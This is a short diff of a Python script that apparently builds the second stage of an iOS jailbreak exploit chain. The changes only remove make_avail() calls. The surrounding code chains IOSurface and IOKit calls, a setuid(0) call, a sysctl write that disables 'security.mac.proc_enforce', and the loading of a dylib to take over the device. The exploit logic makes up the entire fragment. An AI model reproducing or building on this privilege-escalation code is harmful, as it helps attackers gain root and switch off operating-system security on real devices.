@@ -196,11 +196,9 @@ def make_stage2(init_regs, is_boot, heapaddr):
         funcall('_memcpy', None, pdata, len(intro) + len(data))
 
     funcall('_IOSurfaceUnlock', surface, 0, 0, load_r0=True)
-    make_avail()
     #funcall('_abort')
     funcall('_IOConnectCallScalarMethod', connect, 1, js, 2, 0, 0, load_r0=True)
     #print 'imo, IOConnectCallScalarMethod = %x' % syms['_IOConnectCallScalarMethod']
-    make_avail()
 
     if not is_boot:
         funcall('_setuid', 0)
@@ -222,10 +220,8 @@ def make_stage2(init_regs, is_boot, heapaddr):
     funcall('_IOObjectRelease', service)
 
     if is_boot:
-        make_avail()
         
         funcall('_sysctlbyname', ptr('security.mac.proc_enforce', True), 0, 0, zero, 4)
-        make_avail()
     
         launchd = ptr('/sbin/launchd', True)
         argp = ptrI(launchd, 0)
@@ -234,7 +230,6 @@ def make_stage2(init_regs, is_boot, heapaddr):
         funcall('_abort')
         #funcall('_perror', ptr('U fail!', True))
     else:
-        make_avail()
        
         dylib = open('../../installui/installui.dylib').read()
 
